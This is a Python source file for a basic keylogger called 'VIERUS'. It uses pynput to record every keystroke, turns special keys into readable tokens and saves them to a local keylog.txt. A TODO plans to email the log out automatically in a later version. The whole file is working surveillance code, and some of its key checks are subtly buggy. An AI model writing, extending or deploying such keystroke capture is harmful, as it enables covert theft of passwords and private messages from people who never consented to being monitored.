"""
V I E R U S    ||    Date 6/7/2023
Very basic Keylogging to track your keystrokes.
In this program it will also track certain commands and other special keys.

v1.5 > DONE add different special keys, arrow keys, commands, etc
v2.0 > TODO include a way to send the keylog.txt file to an email after a certain amount of keys or until they press teh stop command
"""
import os
from pynput.keyboard import Key, Listener

keys = []
count = 0

#This if statement is for testing purposes, Remove eventually
if os.path.exists("./keylogging/keylog.txt"):
    os.remove("./keylogging/keylog.txt")

def onKey(key):
    global keys, count
    keys.append(key)
    count += 1
    #print("{0}".format(key))
    
    if count >= 2:
        writeFile(keys)

    
def writeFile(keys):
    with open("./keylogging/keylog.txt", "w+") as f:
        with open("./keylogging/keylog.txt", "a") as f:
            for key in keys:   
                k = str(key).replace("'", "")   # Removes single quotes
                
            #Keyboard single command keys
                if k.find("space") > 0:         #space > " " > 1 space
                    f.write(" ")
                    
                elif k.find("caps_lock") > 0:   #Caps Lock > " ^"
                    f.write(" ^")
                    
                elif k.find("cmd") > 0:            #Window key aka cmd > " window-cmd-key "
                    f.write(" window-cmd-key ")

                elif k.find("ctrl_l" or "ctrl_r" or "ctrl") > 0:   #ctrl > " ctrl-command+"
                    f.write(" ctrl-command+")
                
                elif k.find("delete") > 0:      #Delete > " delete-key "
                    f.write(" delete-key ")
                
                elif k.find("end") > 0:         #End > " end-key "
                    f.write(" end-key ")
                
                elif k.find("enter") > 0:       #Enter > " \n"
                    f.write(" \n")

                elif k.find("esc") > 0:         #ESC > " STOP." > similar to morse code
                    f.write(" STOP.")
                
                elif k.find("home") > 0:        #Home > " home-key "
                    f.write(" home-key ")
                
                elif k.find("media_play_pause") > 0:    #Play/Pause > " play/pause-key "
                    f.write(" play/pause-key ")
                
                elif k.find("media_volume_mute") > 0:   #Mute > " mute-key "
                    f.write(" mute-key ")
                
                elif k.find("menu") > 0:            #menu > " menu-key "
                    f.write(" menu-key ")
                    
                elif k.find("print_screen") > 0:    #print-screen > " print-screen-key "
                    f.write(" print-screen-key ")
                    
                elif k.find("shift_l" or "shift_r" or "shift") > 0:       #Shift > ""
                    f.write("")
                    
                elif k.find("tab") > 0:         #Tab > "    " > 4 spaces
                    f.write("    ")
                    
                elif k.find("\\") > 0:          #\\ > " \ "
                    f.write(" \ ")
                
            #arrow keys
                elif k.find("up") > 0:          #Up Arrow > " ^UA^ "
                    f.write(" ^UA^ ")
                    
                elif k.find("down") > 0:        #Down Arrow > " vDAv "
                    f.write(" vDAv ")
                    
                elif k.find("left") > 0:        #Left Arrow > " <LA> "
                    f.write(" <LA> ")
                    
                elif k.find("right") > 0:       #Right Arrow > " <RA> "
                    f.write(" <RA> ")
                    
                    
            #Copy and Paste > other commands later
                elif k.find("x03") > 0:
                    f.write(" Copy-command ")   #Copy Command crtl+c > " Copy-command "
                    
                elif k.find("x16") > 0:
                    f.write(" Paste-command ")  #Paste Command crtl+v > " Paste-command "
                    
            #keep at bottom
                elif k.find("Key") == -1:       #Key > Type as is
                    f.write(k)
                
                else:
                    f.write(str(key))           #Key > Type as string as is


def onRelease(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=onKey, on_release=onRelease) as listener:
    listener.join()

